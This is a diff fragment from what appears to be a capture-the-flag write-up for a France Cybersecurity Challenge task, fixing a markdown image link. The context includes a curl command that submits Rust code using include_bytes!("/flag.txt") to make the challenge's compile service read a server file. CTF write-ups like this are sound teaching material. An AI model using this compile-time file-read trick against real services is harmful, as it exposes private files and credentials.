@@ -6,7 +6,7 @@
 
 Well ... if we can compile Rust, we'll first try to include some file at compile-time with the [`include_bytes!()` macro](https://doc.rust-lang.org/core/macro.include_bytes.html)
 
-![First glance][first_glance.png "At first glance, we can compile anything."]
+![First glance](first_glance.png "At first glance, we can compile anything.")
 
 ```
 $ curl 'http://challenges2.france-cybersecurity-challenge.fr:6005/check' -H 'Content-Type: application/json' --data '{"content":"include_bytes!(\"/flag.txt\");"}' 
